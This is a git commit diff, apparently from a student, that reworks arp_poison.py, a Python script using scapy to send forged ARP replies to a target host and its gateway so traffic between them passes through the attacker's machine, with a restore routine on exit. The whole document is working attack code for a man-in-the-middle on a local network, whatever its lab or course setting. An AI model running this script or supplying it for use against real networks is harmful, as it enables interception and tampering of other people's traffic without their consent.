16870cba58b07a54c09895d476bec0a240423a39
Nico Ramos <nigr21@inf.ufpr.br>
2026-06-04 12:41:20 -0300

    Arruma o script

--- arp_poison.py
+++ arp_poison.py
@@ -2,40 +2,46 @@
 
 import scapy.all as scapy
 import argparse
+import time
 
 def main(gateway_ip, target_ip, interface):
-
-    state = {
-        'target': {
-            'ip': target_ip,
-            'mac': get_mac_address(target_ip, interface)
-        },
-        'gateway': {
-            'ip': gateway_ip,
-            'mac': get_mac_address(gateway_ip, interface)
-        },
-        'attacker': {
-            'mac': scapy.get_if_hwaddr(interface)
-        }
+    target = {
+        'ip': target_ip,
+        'mac': get_mac_address(target_ip, interface)
+    }
+    
+    gateway = {
+        'ip': gateway_ip,
+        'mac': get_mac_address(gateway_ip, interface)
     }
 
-    if not state['target']['mac'] or not state['gateway']['mac']:
+    attacker_mac = scapy.get_if_hwaddr(interface)
+
+    if not target['mac'] or not gateway['mac']:
+        print("Could not retrieve target or gateway MAC addresses. Exiting.")
         return
 
     print("Initial state:")
-    print_state(state)
+    print(f"Gateway: {gateway['ip']} ({gateway['mac']})")
+    print(f"Target: {target['ip']} ({target['mac']})")
+    print(f"Attacker: ({attacker_mac})")
+    print()
 
     print("Starting ARP poisoning attack...")
     try:
+        last_time = 0
         while True:
-            poison_arp(state['gateway']['ip'], state['gateway']['mac'], state['target']['ip'], state['attacker']['mac'], interface) # Target IP points to attacker on gateway ARP table
-            poison_arp(state['target']['ip'], state['target']['mac'], state['gateway']['ip'], state['attacker']['mac'], interface) # Gateway IP points to attacker on target ARP table
-            state = check_state(state, interface)
+            if time.time() - last_time > 5:
+                last_time = time.time()
+                should_print = True
+            else:
+                should_print = False
+            poison_arp(gateway['ip'], gateway['mac'], target['ip'], attacker_mac, interface, should_print) # Target IP points to attacker on gateway ARP table
+            poison_arp(target['ip'], target['mac'], gateway['ip'], attacker_mac, interface, should_print) # Gateway IP points to attacker on target ARP table
     except KeyboardInterrupt:
         print("Restoring ARP tables...")
-        restore_arp(state['target']['ip'], state['target']['mac'], state['gateway']['ip'], state['gateway']['mac'], interface) # Gateway IP points to Gateway MAC on target ARP table
-        restore_arp(state['gateway']['ip'], state['gateway']['mac'], state['target']['ip'], state['target']['mac'], interface) # Target IP points to Target MAC on gateway ARP table
-        state = check_state(state, interface)
+        restore_arp(target['ip'], target['mac'], gateway['ip'], gateway['mac'], interface) # Gateway IP points to Gateway MAC on target ARP table
+        restore_arp(gateway['ip'], gateway['mac'], target['ip'], target['mac'], interface) # Target IP points to Target MAC on gateway ARP table
 
 def get_mac_address(ip, interface):
     try:
@@ -46,38 +52,16 @@ def get_mac_address(ip, interface):
         print(f"Could not get MAC address for {ip}.")
         return None
 
-def print_state(state):
-    print(f"Gateway: {state['gateway']['ip']} ({state['gateway']['mac']})")
-    print(f"Target: {state['target']['ip']} ({state['target']['mac']})")
-    print(f"Attacker: ({state['attacker']['mac']})")
-    print()
-
-def poison_arp(dest_ip, dest_mac, src_ip, attacker_mac, interface):
+def poison_arp(dest_ip, dest_mac, src_ip, attacker_mac, interface, should_print):
     arp_spoof = scapy.Ether(dst=dest_mac)/scapy.ARP(op=2, psrc=src_ip, pdst=dest_ip, hwdst=dest_mac, hwsrc=attacker_mac) # Fake ARP response (op=2)
     scapy.sendp(arp_spoof, iface=interface, verbose=0)
+    if should_print:
+        print(f"Poisoning: {src_ip} -> {dest_ip} ({attacker_mac})")
 
 def restore_arp(dest_ip, dest_mac, src_ip, src_mac, interface):
     pkt = scapy.Ether(dst=dest_mac) / scapy.ARP(op=2, hwsrc=src_mac, hwdst=dest_mac, psrc=src_ip, pdst=dest_ip) # Correct ARP response (op=2)
     scapy.sendp(pkt, iface=interface, verbose=0)
-
-def check_state(prev_state, interface):
-    current_state = {
-        'target': {
-            'ip': prev_state['target']['ip'],
-            'mac': get_mac_address(prev_state['target']['ip'], interface) or prev_state['target']['mac']
-        },
-        'gateway': {
-            'ip': prev_state['gateway']['ip'],
-            'mac': get_mac_address(prev_state['gateway']['ip'], interface) or prev_state['gateway']['mac']
-        },
-        'attacker': {
-            'mac': prev_state['attacker']['mac']
-        }
-    }
-    if current_state != prev_state:
-        print("ARP tables have been modified:")
-        print_state(current_state)
-    return current_state
+    print(f"Restoring: {src_ip} -> {dest_ip} ({dest_mac})")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
